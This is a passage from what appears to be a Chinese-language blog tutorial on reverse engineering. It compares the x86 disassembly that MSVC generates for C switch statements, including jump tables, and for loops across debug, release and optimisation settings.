class=\"line\">00FF141B    E8 25FDFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF1420    EB <span class=\"number\">49</span>           jmp     short 00FF146B</span><br><span class=\"line\">//<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1422    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF1424    <span class=\"number\">68</span> 4C57FF00     push    00FF574C                                ; ASCII <span class=\"string\">&quot;2222&quot;</span></span><br><span class=\"line\">00FF1429    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF142F    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\"></span><br><span class=\"line\">00FF1432    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF1434    E8 0CFDFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF1439    EB <span class=\"number\">30</span>           jmp     short 00FF146B</span><br><span class=\"line\"></span><br><span class=\"line\">00FF143B    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF143D    <span class=\"number\">68</span> 4457FF00     push    00FF5744                                ; ASCII <span class=\"string\">&quot;3333&quot;</span></span><br><span class=\"line\">00FF1442    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF1448    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\">00FF144B    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF144D    E8 F3FCFFFF     call    00FF1145</span><br><span class=\"line\">00FF1452    EB <span class=\"number\">17</span>           jmp     short 00FF146B</span><br><span class=\"line\">00FF1454    8BF4            mov     esi,esp</span><br><span class=\"line\">00FF1456    <span class=\"number\">68</span> 3C57FF00     push    00FF573C                                ; ASCII <span class=\"string\">&quot;shabi&quot;</span></span><br><span class=\"line\">00FF145B    FF15 BC82FF00   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">00FF1461    83C4 04         add     esp,<span class=\"number\">0x4</span></span><br><span class=\"line\">00FF1464    3BF4            cmp     esi,esp</span><br><span class=\"line\">00FF1466    E8 DAFCFFFF     call    00FF1145</span><br><span class=\"line\"></span><br><span class=\"line\">00FF146B    33C0            xor     eax,eax</span><br><span class=\"line\">00FF146D    5F              pop     edi</span><br><span class=\"line\">00FF146E    5E              pop     esi</span><br><span class=\"line\">00FF146F    5B              pop     ebx</span><br><span class=\"line\">00FF1470    81C4 DC000000   add     esp,<span class=\"number\">0xDC</span></span><br><span class=\"line\">00FF1476    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00FF1478    E8 C8FCFFFF     call    00FF1145</span><br><span class=\"line\">00FF147D    8BE5            mov     esp,ebp</span><br><span class=\"line\">00FF147F    5D              pop     ebp</span><br><span class=\"line\">00FF1480    C3              retn</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>release</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">011C1000 &gt;/$  56            push    esi</span><br><span class=\"line\">011C1001  |.  8B35 A0201C01 mov     esi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]   ;  msvcr90.printf</span><br><span class=\"line\">011C1007  |.  68 F4201C01   push    011C20F4                               ; /format = &quot;haha&quot;</span><br><span class=\"line\">011C100C  |.  FFD6          call    esi                                    ; \\printf</span><br><span class=\"line\">011C100E  |.  68 FC201C01   push    011C20FC                               ;  ASCII &quot;1111&quot;</span><br><span class=\"line\">011C1013  |.  FFD6          call    esi</span><br><span class=\"line\">011C1015  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">011C1018  |.  33C0          xor     eax,eax</span><br><span class=\"line\">011C101A  |.  5E            pop     esi</span><br><span class=\"line\">011C101B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>如果 case 很多的时候，会使用导出表</p>\n<p>用 case 最大的 - case 最小的，得出的范围称为 k，如果要判断的值 - case 最小的值不在范围 k 之内，直接 default</p>\n<p>其实这样的，edx 存放的是 a 与 case 中最小值的差值，而 eax*4 + 地址存放的是每个 case 的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;haha&quot;);</span><br><span class=\"line\">\tint a=5;</span><br><span class=\"line\">\tswitch(a)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tcase 1:</span><br><span class=\"line\">\t\tprintf(&quot;1&quot;);</span><br><span class=\"line\">\tcase 5:</span><br><span class=\"line\">\t\tprintf(&quot;5&quot;);</span><br><span class=\"line\">\tcase 9:</span><br><span class=\"line\">\t\tprintf(&quot;9&quot;);</span><br><span class=\"line\">\tcase 2:</span><br><span class=\"line\">\t\tprintf(&quot;2&quot;);</span><br><span class=\"line\">\tcase 7:</span><br><span class=\"line\">\t\tprintf(&quot;7&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase 13:</span><br><span class=\"line\">\t\tprintf(&quot;13&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tdefault:</span><br><span class=\"line\">\t\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00F713A0 &gt;  55              push    ebp</span><br><span class=\"line\">00F713A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00F713A3    81EC D0000000   sub     esp,0xD0</span><br><span class=\"line\">00F713A9    53              push    ebx</span><br><span class=\"line\">00F713AA    56              push    esi</span><br><span class=\"line\">00F713AB    57              push    edi</span><br><span class=\"line\">00F713AC    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">00F713B2    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">00F713B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00F713BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00F713BE    8BF4            mov     esi,esp</span><br><span class=\"line\">00F713C0    68 5C57F700     push    00F7575C                              ; ASCII &quot;haha&quot;</span><br><span class=\"line\">00F713C5    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F713CB    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F713CE    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F713D0    E8 70FDFFFF     call    00F71145</span><br><span class=\"line\">00F713D5    C745 F8 0500000&gt;mov     dword ptr ss:[ebp-0x8],0x5            ; a = 5</span><br><span class=\"line\">00F713DC    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00F713DF    8985 30FFFFFF   mov     dword ptr ss:[ebp-0xD0],eax</span><br><span class=\"line\">00F713E5    8B8D 30FFFFFF   mov     ecx,dword ptr ss:[ebp-0xD0]           ; ecx = eax = 5</span><br><span class=\"line\">00F713EB    83E9 01         sub     ecx,0x1                               ; ecx = ecx - 1 计算a与case中最小值的差值</span><br><span class=\"line\">00F713EE    898D 30FFFFFF   mov     dword ptr ss:[ebp-0xD0],ecx           ; [ebp-0x0d] = 4 4在13-1的范围之间</span><br><span class=\"line\">00F713F4    83BD 30FFFFFF 0&gt;cmp     dword ptr ss:[ebp-0xD0],0xC           ; 将a 与case 中最小值的差1值和case最大最小差值12相比</span><br><span class=\"line\">00F713FB    0F87 A2000000   ja      00F714A3                              ; 如果当前要比较的值和case最小值的差值&gt;12,直接default</span><br><span class=\"line\">00F71401    8B95 30FFFFFF   mov     edx,dword ptr ss:[ebp-0xD0]           ; edx中存放的就是a与case最小值的差值 0xF714EC存放导出表地址</span><br><span class=\"line\">00F71407    0FB682 EC14F700 movzx   eax,byte ptr ds:[edx+0xF714EC]        ; eax=2</span><br><span class=\"line\">00F7140E    FF2485 D014F700 jmp     dword ptr ds:[eax*4+0xF714D0]         ; 2*4 + 0xF714D0</span><br><span class=\"line\">00F71415    8BF4            mov     esi,esp</span><br><span class=\"line\">00F71417    68 5857F700     push    00F75758                              ; UNICODE &quot;1&quot;</span><br><span class=\"line\">00F7141C    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71422    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F71425    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F71427    E8 19FDFFFF     call    00F71145</span><br><span class=\"line\">00F7142C    8BF4            mov     esi,esp</span><br><span class=\"line\">00F7142E    68 5457F700     push    00F75754                              ; UNICODE &quot;5&quot;</span><br><span class=\"line\">00F71433    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71439    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F7143C    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F7143E    E8 02FDFFFF     call    00F71145</span><br><span class=\"line\">00F71443    8BF4            mov     esi,esp</span><br><span class=\"line\">00F71445    68 5057F700     push    00F75750                              ; UNICODE &quot;9&quot;</span><br><span class=\"line\">00F7144A    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71450    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F71453    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F71455    E8 EBFCFFFF     call    00F71145</span><br><span class=\"line\">00F7145A    8BF4            mov     esi,esp</span><br><span class=\"line\">00F7145C    68 4C57F700     push    00F7574C                              ; UNICODE &quot;2&quot;</span><br><span class=\"line\">00F71461    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71467    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F7146A    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F7146C    E8 D4FCFFFF     call    00F71145</span><br><span class=\"line\">00F71471    8BF4            mov     esi,esp</span><br><span class=\"line\">00F71473    68 4857F700     push    00F75748                              ; UNICODE &quot;7&quot;</span><br><span class=\"line\">00F71478    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F7147E    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F71481    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F71483    E8 BDFCFFFF     call    00F71145</span><br><span class=\"line\">00F71488    EB 30           jmp     short printf</span><br><span class=\"line\">00F7148A    8BF4            mov     esi,esp</span><br><span class=\"line\">00F7148C    68 4457F700     push    00F75744                              ; ASCII &quot;13&quot;</span><br><span class=\"line\">00F71491    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F71497    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F7149A    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F7149C    E8 A4FCFFFF     call    00F71145</span><br><span class=\"line\">00F714A1    EB 17           jmp     short printf</span><br><span class=\"line\">00F714A3    8BF4            mov     esi,esp</span><br><span class=\"line\">00F714A5    68 3C57F700     push    00F7573C                              ; ASCII &quot;shabi&quot;</span><br><span class=\"line\">00F714AA    FF15 BC82F700   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]     ; msvcr90d.printf</span><br><span class=\"line\">00F714B0    83C4 04         add     esp,0x4</span><br><span class=\"line\">00F714B3    3BF4            cmp     esi,esp</span><br><span class=\"line\">00F714B5    E8 8BFCFFFF     call    00F71145</span><br><span class=\"line\">00F714BA &gt;  33C0            xor     eax,eax</span><br><span class=\"line\">00F714BC    5F              pop     edi</span><br><span class=\"line\">00F714BD    5E              pop     esi</span><br><span class=\"line\">00F714BE    5B              pop     ebx</span><br><span class=\"line\">00F714BF    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">00F714C5    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00F714C7    E8 79FCFFFF     call    00F71145</span><br><span class=\"line\">00F714CC    8BE5            mov     esp,ebp</span><br><span class=\"line\">00F714CE    5D              pop     ebp</span><br><span class=\"line\">00F714CF    C3              retn</span><br><span class=\"line\">\t</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如果 a=9, 9-1=8<br>\ndb 8+0xF714EC   ==  4      db 8+0xF714EC</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119102654407.png\" alt=\"image-20221119102654407\"><a href=\"\"></a></p>\n<p>dd 4 * 4 + 0xF714D0 ==</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119102748365.png\" alt=\"image-20221119102748365\">\\</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119102822429.png\" alt=\"image-20221119102822429\">`</p>\n<p>也就是说 F714EC 中存放的就是导出表</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119103208537.png\" alt=\"image-20221119103208537\">·</p>\n</blockquote>\n</blockquote>\n<h4 id=\"for\"><a class=\"markdownIt-Anchor\" href=\"#for\">#</a> for</h4>\n<blockquote>\n<p>for 循环</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for (int i=1;i&lt;=10;++i) &#123;</span><br><span class=\"line\">\tprintf(&quot;%d&quot;,i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>debug，禁止优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">013013BE    C745 F8 0100000&gt;mov     dword ptr ss:[ebp-0x8],0x1</span><br><span class=\"line\">013013C5    EB 09           jmp     short 013013D0</span><br><span class=\"line\">013013C7    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013013CA    83C0 01         add     eax,0x1</span><br><span class=\"line\">013013CD    8945 F8         mov     dword ptr ss:[ebp-0x8],eax</span><br><span class=\"line\">013013D0    837D F8 0A      cmp     dword ptr ss:[ebp-0x8],0xA</span><br><span class=\"line\">013013D4    7F 1D           jg      short 013013F3</span><br><span class=\"line\">013013D6    8BF4            mov     esi,esp</span><br><span class=\"line\">013013D8    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">013013DB    50              push    eax</span><br><span class=\"line\">013013DC    68 3C573001     push    0130573C                                ; ASCII &quot;%d&quot;</span><br><span class=\"line\">013013E1    FF15 BC823001   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]       ; msvcr90d.printf</span><br><span class=\"line\">013013E7    83C4 08         add     esp,0x8</span><br><span class=\"line\">013013EA    3BF4            cmp     esi,esp</span><br><span class=\"line\">013013EC    E8 54FDFFFF     call    01301145</span><br><span class=\"line\">013013F1  ^ EB D4           jmp     short 013013C7</span><br><span class=\"line\">013013F3    33C0            xor     eax,eax    \t\t\t\t\t\t\t\t;eax清零，作为返回值</span><br><span class=\"line\">013013F5    5F              pop     edi</span><br><span class=\"line\">013013F6    5E              pop     esi</span><br><span class=\"line\">013013F7    5B              pop     ebx</span><br><span class=\"line\">013013F8    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">013013FE    3BEC            cmp     ebp,esp</span><br><span class=\"line\">01301400    E8 40FDFFFF     call    01301145</span><br><span class=\"line\">01301405    8BE5            mov     esp,ebp</span><br><span class=\"line\">01301407    5D              pop     ebp                              </span><br><span class=\"line\">01301408    C3              retn</span><br></pre></td></tr></table></figure>\n<p>release，O/2 优化</p>\n<p>最大化速度优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00361000 &gt;/$  56            push    esi</span><br><span class=\"line\">00361001  |.  68 84B33600   push    0036B384                              ; /format = &quot;shabi&quot;</span><br><span class=\"line\">00361006  |.  E8 2F000000   call    printf                                ; \\printf</span><br><span class=\"line\">0036100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0036100E  |.  BE 01000000   mov     esi,0x1</span><br><span class=\"line\">00361013  |&gt;  56            /push    esi                                  ; /&lt;%d&gt;</span><br><span class=\"line\">00361014  |.  68 8CB33600   |push    0036B38C                             ; |format = &quot;%d&quot;</span><br><span class=\"line\">00361019  |.  E8 1C000000   |call    printf                               ; \\printf</span><br><span class=\"line\">0036101E  |.  46            |inc     esi</span><br><span class=\"line\">0036101F  |.  83C4 08       |add     esp,0x8</span><br><span class=\"line\">00361022  |.  83FE 0A       |cmp     esi,0xA</span><br><span class=\"line\">00361025  |.^ 7E EC         \\jle     short 00361013</span><br><span class=\"line\">00361027  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00361029  |.  5E            pop     esi</span><br><span class=\"line\">0036102A  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>release，O/1 优化</p>\n<p>大小最小化优化情况下，for</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01161000 &gt;/$  56            push    esi</span><br><span class=\"line\">01161001  |.  57            push    edi\t\t\t\t\t\t\t\t\t\t ; 保护edi</span><br><span class=\"line\">01161002  |.  8B3D A0201601 mov     edi,dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]     ;  printf给edi，调用时直接call edi，用寄存器代替内存</span><br><span class=\"line\">01161008  |.  68 F4201601   push    011620F4                                 ; /format = &quot;shabi&quot;，printf参数入栈</span><br><span class=\"line\">0116100D  |.  FFD7          call    edi                                      ; call printf</span><br><span class=\"line\">0116100F  |.  33F6          xor     esi,esi\t\t\t\t\t\t\t\t\t ; esi = 0</span><br><span class=\"line\">01161011  |.  59            pop     ecx\t\t\t\t\t\t\t\t\t\t ; 堆栈平衡，可以理解为esp+4</span><br><span class=\"line\">01161012  |.  46            inc     esi</span><br><span class=\"line\"></span><br><span class=\"line\">//循环代码段</span><br><span class=\"line\">01161013  |&gt;  56            /push    esi\t\t\t\t\t\t\t\t\t ; i 入栈</span><br><span class=\"line\">01161014  |.  68 FC201601   |push    011620FC                                ;  ASCII &quot;%d&quot;入栈</span><br><span class=\"line\">01161019  |.  FFD7          |call    edi\t\t\t\t\t\t\t\t\t ; call printf 编译器判断第一次可以执行，直接优化</span><br><span class=\"line\">0116101B  |.  46            |inc     esi</span><br><span class=\"line\">0116101C &gt;|.  83FE 0A       |cmp     esi,0xA</span><br><span class=\"line\">0116101F  |.  59            |pop     ecx</span><br><span class=\"line\">01161020  |.  59            |pop     ecx \t\t\t\t\t\t\t\t\t ; 两次pop堆栈平衡 esp+8</span><br><span class=\"line\">01161021  |.^ 7E F0         \\jle     short 01161013</span><br><span class=\"line\"></span><br><span class=\"line\">01161023  |.  5F            pop     edi</span><br><span class=\"line\">01161024  |.  33C0          xor     eax,eax</span><br><span class=\"line\">01161026 &gt;|.  5E            pop     esi</span><br><span class=\"line\">01161027  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">//inc 一个字节，pop edi一个字节，</span><br><span class=\"line\">//add 三个字节，</span><br></pre></td></tr></table></figure>\n<p>release，关闭优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00191000 &gt; $  55            push    ebp</span><br><span class=\"line\">00191001   .  8BEC          mov     ebp,esp</span><br><span class=\"line\">00191003   .  51            push    ecx</span><br><span class=\"line\">//这个ecx在最后没有出栈，所以不是用来保护的，而是用来分配堆栈空间的</span><br><span class=\"line\"></span><br><span class=\"line\">00191004   .  C745 FC 01000&gt;mov     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">0019100B   .  EB 09         jmp     short 00191016</span><br><span class=\"line\">0019100D   &gt;  8B45 FC       mov     eax,dword ptr ss:[ebp-0x4]</span><br><span class=\"line\">00191010   .  83C0 01       add     eax,0x1</span><br><span class=\"line\">00191013   .  8945 FC       mov     dword ptr ss:[ebp-0x4],eax</span><br><span class=\"line\">00191016   &gt;  837D FC 0A    cmp     dword ptr ss:[ebp-0x4],0xA</span><br><span class=\"line\">0019101A   .  7F 14         jg      short 00191030</span><br><span class=\"line\">0019101C   .  8B4D FC       mov     ecx,dword ptr ss:[ebp-0x4]</span><br><span class=\"line\">0019101F   .  51            push    ecx         \t\t\t\t\t ;  根据从右到左的入栈数据，i先入栈，%d后入</span><br><span class=\"line\">00191020   .  68 F4201900   push    001920F4                         ;  ASCII &quot;%d&quot;</span><br><span class=\"line\">00191025      FF            db      FF</span><br><span class=\"line\">00191026 &gt; .  15 A0201900   adc     eax,&lt;&amp;MSVCR90.printf&gt;</span><br><span class=\"line\">0019102B   .  83C4 08       add     esp,0x8  \t\t\t\t\t\t ;  printf有两个参数，因此堆栈平衡时需要+8</span><br><span class=\"line\">0019102E   .^ EB DD         jmp     short 0019100D</span><br><span class=\"line\">00191030   &gt;  33C0          xor     eax,eax\t\t\t\t\t\t\t ;  eax作为函数返回值，此处将eax清零</span><br><span class=\"line\">00191032   .  8BE5          mov     esp,ebp</span><br><span class=\"line\">00191034   .  5D            pop     ebp</span><br><span class=\"line\">00191035 &gt; .  C3            retn</span><br></pre></td></tr></table></figure>\n<p>release，完全优化 / Ox</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">010E1000 &gt;/$  56            push    esi</span><br><span class=\"line\">010E1001  |.  68 84B30E01   push    010EB384                         ; /format = &quot;shabi&quot;</span><br><span class=\"line\">010E1006  |.  E8 2F000000   call    printf                           ; \\printf</span><br><span class=\"line\">010E100B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">010E100E  |.  BE 01000000   mov     esi,0x1</span><br><span class=\"line\">010E1013  |&gt;  56            /push    esi                             ; /&lt;%d&gt;</span><br><span class=\"line\">010E1014  |.  68 8CB30E01   |push    010EB38C                        ; |format = &quot;%d&quot;</span><br><span class=\"line\">010E1019  |.  E8 1C000000   |call    printf                          ; \\printf</span><br><span class=\"line\">010E101E  |.  46            |inc     esi</span><br><span class=\"line\">010E101F  |.  83C4 08       |add     esp,0x8</span><br><span class=\"line\">010E1022  |.  83FE 0A       |cmp     esi,0xA</span><br><span class=\"line\">010E1025  |.^ 7E EC         \\jle     short 010E1013</span><br><span class=\"line\">010E1027  |.  33C0          xor     eax,eax</span><br><span class=\"line\">010E1029  |.  5E            pop     esi</span><br><span class=\"line\">010E102A  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h4 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> ++ –</h4>\n<blockquote>\n<p>inc a  //i++  ++i  速度比 add 快，占用空间小，指令执行影响 